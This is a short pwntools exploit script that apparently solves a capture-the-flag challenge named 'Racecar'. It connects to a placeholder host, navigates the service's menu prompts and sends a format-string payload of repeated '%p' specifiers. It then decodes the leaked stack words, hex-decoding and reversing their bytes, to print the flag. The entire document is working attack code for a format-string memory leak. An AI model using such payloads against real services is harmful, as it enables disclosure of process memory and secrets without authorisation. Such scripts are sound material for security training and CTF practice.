from pwn import *

def get_flag(txt):
        txt = txt.replace('0x', '').split(' ')
        txt = txt[11:]    
        flag = b''
        for x in txt: 
                flag += unhex(x)[::-1]
        print(flag.decode('utf-8'))

conn = remote('HOST', PORT)
print(conn.sendlineafter(b'Name', b'Racecar').decode('utf-8'))
print(conn.recv().decode('utf-8'))
print(conn.sendlineafter(b'Nickname', b'Racer').decode('utf-8'))
print(conn.recvline().decode('utf-8'))
print(conn.sendlineafter(b'2.', b'2').decode('utf-8'))
print(conn.recvline().decode('utf-8'))
print(conn.sendlineafter(b'2.', b'2').decode('utf-8'))
print(conn.recvline().decode('utf-8'))
print(conn.sendlineafter(b'1.', b'1').decode('utf-8'))
print(conn.recvline().decode('utf-8'))
print(conn.sendlineafter(b'?', b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p').decode('utf-8'))
conn.recvline()
conn.recvline()
conn.recvline()
get_flag(conn.recvline().decode('utf-8'))
conn.close()
